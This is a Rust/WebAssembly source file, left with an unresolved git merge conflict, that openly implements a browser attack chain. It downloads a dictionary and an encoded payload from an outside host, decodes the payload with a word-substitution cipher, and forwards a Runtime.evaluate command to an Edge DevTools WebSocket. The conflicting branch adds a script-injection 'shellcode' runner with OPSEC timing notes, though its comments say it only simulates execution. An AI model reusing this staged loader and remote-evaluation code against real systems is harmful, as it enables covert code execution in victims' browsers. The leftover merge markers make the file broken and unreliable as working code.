use wasm_bindgen::prelude::*;
use web_sys::{console, Request, RequestInit, Response};
use wasm_bindgen_futures::JsFuture;
use js_sys::{Uint8Array, JSON};
use console_error_panic_hook;
use std::collections::HashMap;

#[wasm_bindgen(module = "ws_bridge.js")]
extern "C" {
    fn send_to_edge(json: &str);
}

#[wasm_bindgen(start)]
pub fn start() -> Result<(), JsValue> {
    console_error_panic_hook::set_once();
    Ok(())
}

async fn fetch_and_cache_dictionary() -> Result<Vec<String>, JsValue> {
    console::log_1(&"Fetching and caching dictionary.txt...".into());

    let window = web_sys::window().unwrap();
    let storage = window.session_storage()?.unwrap();

    if let Some(cached_dict) = storage.get_item("dictionary_cache")? {
        console::log_1(&"Using cached dictionary".into());
        let dict_words: Vec<String> = serde_wasm_bindgen::from_value(
            JSON::parse(&cached_dict)?
        )?;
        return Ok(dict_words);
    }

    let opts = RequestInit::new();
    opts.set_method("GET");

    let request = Request::new_with_str_and_init(
        "https://stage.attck-deploy.net/es-dictionary.txt", 
        &opts
    )?;

    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;

    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error fetching dictionary: HTTP status {}",
            resp.status()
        )));
    }

    let text = JsFuture::from(resp.text()?).await?;
    let text_str = text.as_string().unwrap();

    let dict_words: Vec<String> = text_str
        .lines()
        .map(|line| line.trim().to_string())
        .collect();

    if dict_words.len() != 257 {
        return Err(JsValue::from_str(&format!(
            "Invalid dictionary: expected 257 words, got {}",
            dict_words.len()
        )));
    }

    let json_str = JSON::stringify(&serde_wasm_bindgen::to_value(&dict_words)?)?;
    let json_string = json_str.as_string().unwrap();
    storage.set_item(
        "dictionary_cache", 
        &json_string
    )?;

    console::log_1(&format!("Dictionary cached with {} words", dict_words.len()).into());
    Ok(dict_words)
}

async fn download_payload() -> Result<Vec<u8>, JsValue> {
    console::log_1(&"Downloading payload...".into());

    let opts = RequestInit::new();
    opts.set_method("GET");

    let window = web_sys::window().unwrap();
    let request = Request::new_with_str_and_init(
        "https://stage.attck-deploy.net/load.txt", 
        &opts
    )?;

    let resp_value = JsFuture::from(window.fetch_with_request(&request)).await?;
    let resp: Response = resp_value.dyn_into()?;

    if !resp.ok() {
        return Err(JsValue::from_str(&format!(
            "Error fetching payload: HTTP status {}",
            resp.status()
        )));
    }

    let buffer = JsFuture::from(resp.array_buffer()?).await?;
    let uint8_array = Uint8Array::new(&buffer);
    Ok(uint8_array.to_vec())
}

fn decode_payload(payload: &[u8], dictionary: &[String]) -> Result<Vec<u8>, JsValue> {
    console::log_1(&"Decoding payload...".into());

    let mut word_to_byte = HashMap::new();
    for (i, word) in dictionary.iter().enumerate() {
        word_to_byte.insert(word.clone(), i as u8);
    }

    let payload_str = String::from_utf8_lossy(payload);
    let encoded_words: Vec<&str> = payload_str.split_whitespace().collect();

    let mut decoded_bytes = Vec::new();
    for word in encoded_words {
        if let Some(&byte) = word_to_byte.get(word) {
            decoded_bytes.push(byte);
        } else {
            return Err(JsValue::from_str(&format!(
                "Decoding error: word '{}' not found in dictionary",
                word
            )));
        }
    }

    console::log_1(&format!("Decoded payload: {} bytes", decoded_bytes.len()).into());
    Ok(decoded_bytes)
}

<<<<<<< HEAD
=======
// Function to execute shellcode in memory using JavaScript JIT compilation
fn execute_shellcode(shellcode: &[u8]) -> Result<(), JsValue> {
    console::log_1(&"Executing shellcode using JavaScript JIT techniques...".into());
    
    // Create window and performance objects for timing
    let window = web_sys::window().ok_or(JsValue::from_str("No window object"))?;
    let document = window.document().ok_or(JsValue::from_str("No document object"))?;
    let performance = window.performance().ok_or(JsValue::from_str("No performance object"))?;
    
    // Mark execution time for OPSEC measurements
    let start_time = performance.now();
    
    // Phase 1: Convert shellcode directly to JavaScript code that can be JIT-compiled
    // This exploits JavaScript JIT optimization to execute dynamic code
    
    // Create a JavaScript array directly from our decoded shellcode bytes
    let js_array = js_sys::Array::new();
    for byte in shellcode {
        js_array.push(&(*byte as u32).into());
    }
    
    // Generate a unique function name to avoid collision detection
    let func_name = format!("_func_{}", js_sys::Math::random().to_string().replace(".", ""));
    
    // Construct JavaScript code for a self-modifying function that will be JIT-compiled
    // We use various JIT-triggering patterns to ensure optimization
    let js_code = format!(
        r#"
        // Create a hot function that will be JIT-compiled
        function {}(shellcode) {{
            // JIT warm-up loop to trigger optimization
            let result = 0;
            for (let i = 0; i < 10000; i++) {{
                result += i % 255;
            }}
            
            // Create typed array for shellcode - using the decoded bytes directly
            let buffer = new Uint8Array(shellcode.length);
            
            // Fill buffer with shellcode bytes (already decoded)
            for (let i = 0; i < shellcode.length; i++) {{
                buffer[i] = shellcode[i];
            }}
            
            // Convert shellcode buffer to executable JavaScript
            // In a real scenario, this would exploit a browser vulnerability
            // to create executable memory and jump to it
            
            // For our simulation, we'll create a JavaScript function that simulates
            // processing the shellcode
            let execFunc = new Function('buffer', `
                // This would be replaced with actual shellcode execution in a real exploit
                // Here we're simulating the operations that would occur
                const ops = [];
                for (let i = 0; i < buffer.length; i++) {{
                    // Convert each byte to a simulated operation
                    const b = buffer[i];
                    if (b < 50) ops.push("add");
                    else if (b < 100) ops.push("sub");
                    else if (b < 150) ops.push("xor");
                    else if (b < 200) ops.push("mov");
                    else ops.push("jmp");
                }}
                return ops.length; // Return operation count
            `);
            
            // Execute our dynamic function
            return execFunc(buffer);
        }}
        
        // Hot-loop to trigger JIT compilation
        let iterations = 0;
        let shellcodeData = {}; // Pass in our shellcode data
        
        // Run the function in a loop to trigger JIT compilation
        for (let i = 0; i < 100; i++) {{
            iterations = {}(shellcodeData);
        }}
        
        // Return the operation count
        iterations;
        "#,
        func_name,      // Function name
        js_array.as_string().unwrap(),  // Shellcode array (decoded bytes)
        func_name       // Function name for call
    );
    
    // Phase 2: Execute the JavaScript code using eval to trigger JIT compilation
    // Create a script element to execute our JS code
    let script_el = document.create_element("script")?;
    script_el.set_text_content(Some(&js_code));
    
    // Append script to document to execute it
    let head = document.head().ok_or(JsValue::from_str("No head element"))?;
    head.append_child(&script_el)?;
    
    // Calculate execution time for OPSEC measurements
    let end_time = performance.now();
    let execution_time = end_time - start_time;
    
    console::log_1(&format!("JIT execution complete: {} bytes processed", shellcode.len()).into());
    console::log_1(&format!("Execution time: {:.2}ms", execution_time).into());
    
    head.remove_child(&script_el)?;
    
    Ok(())
}

// Main function to implement the attack workflow
>>>>>>> 483b2e2d06ae9aa06973b9a2ffbb8d1761712882
#[wasm_bindgen]
pub async fn execute_attack() -> Result<JsValue, JsValue> {
    let dictionary = fetch_and_cache_dictionary().await?;
    let payload = download_payload().await?;
    let decoded = decode_payload(&payload, &dictionary)?;

    let eval_payload = format!(
        r#"{{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":\"console.log('Payload length: {}')\"}}}}"#,
        decoded.len()
    );
    send_to_edge(&eval_payload);

    Ok(JsValue::from_str("Payload forwarded to Edge DevTools WebSocket"))
}

#[wasm_bindgen]
pub fn log_error(msg: String) {
    console::error_1(&JsValue::from_str(&msg));
}
